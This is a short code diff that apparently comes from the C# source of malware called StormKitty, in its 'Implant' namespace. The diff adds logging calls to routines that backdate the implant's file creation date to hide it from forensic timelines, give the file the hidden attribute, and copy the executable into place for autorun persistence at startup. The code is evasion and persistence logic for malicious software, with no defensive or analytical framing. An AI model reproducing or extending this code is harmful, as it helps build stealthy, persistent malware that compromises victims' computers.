@@ -21,6 +21,9 @@ namespace StormKitty.Implant
         {
             string filename = path;
             if (path == null) filename = ExecutablePath;
+            // Log
+            Logging.Log("SetFileCreationDate : Changing file " + filename + " creation data");
+
             DateTime time = new DateTime(
                 DateTime.Now.Year - 2, 5, 22, 3, 16, 28);
 
@@ -34,6 +37,8 @@ namespace StormKitty.Implant
         {
             string filename = path;
             if (path == null) filename = ExecutablePath;
+            // Log
+            Logging.Log("HideFile : Adding 'hidden' attribute to file " + filename);
             new FileInfo(filename).Attributes |= FileAttributes.Hidden;
         }
 
@@ -47,6 +52,7 @@ namespace StormKitty.Implant
         // Install module to startup
         public static void Install()
         {
+            Logging.Log("Startup : Adding to autorun...");
             // Copy executable
             if (!File.Exists(InstallFile))
                 File.Copy(ExecutablePath, InstallFile);
